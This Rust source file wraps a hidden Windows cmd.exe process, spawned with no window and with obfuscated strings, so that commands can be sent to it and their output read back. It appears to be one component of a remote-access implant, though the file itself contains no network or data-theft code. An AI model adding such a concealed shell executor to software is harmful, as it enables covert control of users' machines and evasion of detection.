use std::os::windows::process::CommandExt;
use std::process::{ Command, Stdio, Child };
use std::io::{ BufReader, BufRead, Write };
use obfstr::obfstr as s;
use anyhow::{ Context, Result };
pub struct Terminal {
    process: Child,
    stdin: std::process::ChildStdin,
    stdout: BufReader<std::process::ChildStdout>,
    stderr: BufReader<std::process::ChildStderr>,
}

impl Terminal {
    pub fn new() -> Result<Self> {
        // Start a shell process that will be reused
        let mut cmd = Command::new(s!("cmd"))
            .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .context(s!("Failed to spawn cmd").to_string())?;

        let stdin = cmd.stdin.take().context(s!("Failed to open stdin").to_string())?;
        let stdout = cmd.stdout.take().context(s!("Failed to open stdout").to_string())?;
        let stderr = cmd.stderr.take().context(s!("Failed to open stderr").to_string())?;
        let stdout_reader = BufReader::new(stdout);
        let stderr_reader = BufReader::new(stderr);

        Ok(Terminal {
            process: cmd,
            stdin,
            stdout: stdout_reader,
            stderr: stderr_reader,
        })
    }

    pub fn execute(&mut self, command: &str) -> Result<String> {
        let command = if command.ends_with('\n') {
            command.to_owned()
        } else {
            format!("{}\n", command)
        };

        // Write the command to stdin
        self.stdin.write_all(command.as_bytes())?;
        self.stdin.flush()?;

        let mut output = String::new();
        let mut buffer = Vec::new();

        while let Ok(n) = self.stdout.read_until(b"\n"[0], &mut buffer) {
            if n == 0 {
                break;
            }
            output.push_str(&String::from_utf8_lossy(&buffer));

            // Check for command completion (double newline)
            if output.ends_with("\r\n\r\n") {
                break;
            }
            buffer.clear();
        }

        Ok(output)
    }
}

impl Drop for Terminal {
    fn drop(&mut self) {
        // Cleanup: try to exit the shell gracefully
        let _ = self.execute(s!("exit"));
        let _ = self.process.kill();
    }
}
